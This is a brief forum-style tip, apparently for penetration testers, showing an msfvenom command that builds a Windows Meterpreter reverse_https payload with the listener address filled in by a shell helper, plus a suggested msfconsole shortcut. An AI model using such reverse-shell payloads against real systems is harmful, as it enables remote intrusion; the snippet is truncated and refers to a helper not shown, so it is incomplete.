msfvenom -p windows/meterpreter/reverse_https lhost=\`getip eth0\` ...

 or even better...

msfconsole eth0

 which sets a global lhost variable to the given interface's ip

For us lazy folks...

Just paste the contents into a bash terminal
